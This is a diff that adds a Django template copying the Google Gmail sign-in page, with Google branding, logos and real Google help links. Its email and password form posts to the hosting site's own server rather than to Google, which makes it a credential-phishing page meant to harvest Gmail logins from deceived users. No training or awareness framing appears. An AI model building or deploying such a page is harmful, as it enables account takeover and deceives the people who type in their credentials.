@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+{% load static %}
+{%  block content %}
+
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title> Google Gmail Login</title>
+  <link rel="shortcut icon" href="{% static 'images/google.png' %}">
+
+  
+  <link rel='stylesheet' href='https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css'>
+  <link rel="stylesheet" href="{% static 'css/style1.css'%}">
+<style> 
+.errorlist{
+    font-size: 0%;
+}
+</style>
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<div class="container">
+        <div class="form-container">
+            <div id="email-box">
+                <div class="form-header">
+                    <img id="logo" src="https://storage.googleapis.com/gd-wagtail-prod-assets/original_images/evolving_google_identity_share.jpg" alt="">
+                    <h2>Sign In</h2>
+                    <h4 >Continue To Gmail</h4>
+                </div>
+                <form method="POST" action="" enctype="multipart/form-data">
+                    {% csrf_token %}
+                <div class="form-group">
+                    {{form.as_p}}
+
+                </div>
+                <ul class="errorlist"><li>This field is required.</li></ul>
+                <div class="form-link">
+                    <label><a href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fwww.google.com%3Fhl%3Den-US&dsh=S-2147351108%3A1703261320057522&ec=GAlA8wE&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en&theme=glif">Forgot Email?</a></label>
+                </div>
+                <br/>
+                <br/>
+                <div class="form-link">
+                    <label>Not your computer? Use Guest mode to sign in privately.</label>
+                    <label><a href="https://support.google.com/chrome/answer/6130773?hl=en">Learn More</a></label>
+                </div>
+                <br/>
+                <br/>
+                <div class="form-link">
+                    <label><a href="https://accounts.google.com/lifecycle/steps/signup/name?continue=https://www.google.com?hl%3Den-US&dsh=S-2147351108:1703261320057522&ec=GAlA8wE&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&theme=glif&TL=AHNYTISu9AHkAHy7g8eGwyyJCPKxQLuqRxM0SDtwAeGmzAMOPJYHKJhKL7V2QvgU">Create Account</a></label>
+                    <button class="btn" onclick="showPasswordBox()">Next</button>
+                </div>
+            </div>
+
+            <div id="password-box">
+                <div class="form-header">
+                    <img id="logo" src="https://storage.googleapis.com/gd-wagtail-prod-assets/original_images/evolving_google_identity_share.jpg" alt="">
+                    <h2>Welcome</h2>
+                    <h4 id ='entered-email'></h4>
+                </div>
+                <div class="form-group">
+                    <input type="password" id="password" onfocus="this.value = this.value;" onfocusout="onPasswordFocus()">
+                    <label class="form-control-placeholder" id="password-label" for="name">Enter Your Password</label>
+                    <i class="fa fa-eye-slash" id="eye-icon" onclick="onEyeClick()"></i>
+                </div>
+                <br/>
+                <br/>
+                <div class="form-link">
+                    <label><a>Forgot password?</a></label>
+                    <button class="btn">Next</button>
+                </div>
+            </div>
+        </form>
+        </div>  
+    </div>
+<!-- partial -->
+<script src="{% static 'js/script1.js'%}"></script>
+{%  endblock content %}
+
+</body>
+</html>
